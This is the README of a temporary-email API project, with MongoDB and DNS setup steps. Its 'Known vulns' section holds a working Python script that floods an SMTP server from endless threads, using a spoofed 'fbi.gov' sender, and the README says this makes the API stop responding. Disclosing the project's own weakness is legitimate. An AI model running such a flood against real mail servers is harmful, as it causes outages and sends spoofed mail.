---------------------------------------
  
<br/>
<div align="center">
  <a href="https://github.com/femboy-party/tempmail-api">
    <img src="https://i.imgur.com/fJYAFil.png" alt="Logo" width="120" height="120">

    ---------------------------------------

### Setup
* Firstly create a mongodb account, and proceed to create a new project.
* Now create a new database.
* <img src="https://cdn.discordapp.com/attachments/901454647917694986/901454657812049990/unknown.png">
* Now goto the database overview and goto the collections tab.
* <img src="https://cdn.discordapp.com/attachments/901454647917694986/901454911882035201/unknown.png">
* Now create a new database / collection.
* <img src="https://cdn.discordapp.com/attachments/901454647917694986/901455049618751498/unknown.png">
* Now edit the following files and put your connection url inside.
```
API/database.py
SMTP/database.py
```
* All you have to do now is run main.py on your vps.

---------------------------------------

### Add domains
1. Open your domain management
<img src="https://cdn.discordapp.com/attachments/897456816949190689/898515103249473546/unknown.png">
2. Go to advanced dns
<img src="https://cdn.discordapp.com/attachments/897456816949190689/898515754641653760/unknown.png">
3. Scroll down until you see mail settings
<img src="https://cdn.discordapp.com/attachments/897456816949190689/898515920639651850/unknown.png">
4. Select MXE Record
<img src="https://cdn.discordapp.com/attachments/897456816949190689/898516078861369354/unknown.png">
5. Put <your vps ip> as the value
<img src="https://cdn.discordapp.com/attachments/897456816949190689/898516266401296384/unknown.png">
6. Save and done!

---------------------------------------

### Known vulns
* SMTP Connections, Spamming smtp connections and attempting to send an email will result in the api not responding until you stop trying to connect/send.
  ```py
  import smtplib
  import threading
  
  def send():
      message = """From: dropout <dropout@fbi.gov>
      To: admin <user@domain.com>
      Subject: SMTP Vuln

      Naughty, Naughty vuln
      """
      try:
          smtp = smtplib.SMTP("stmp.server.com")
          smtp.sendmail("dropout@fbi.gov", "user@domain.com", message)         
      except Exception:
          pass
  
  if __name__ == "__main__":
      while True:
          threading.Thread(target=send).start()
  ```

---------------------------------------

### Contact
bo@cia.contact
bo#0005
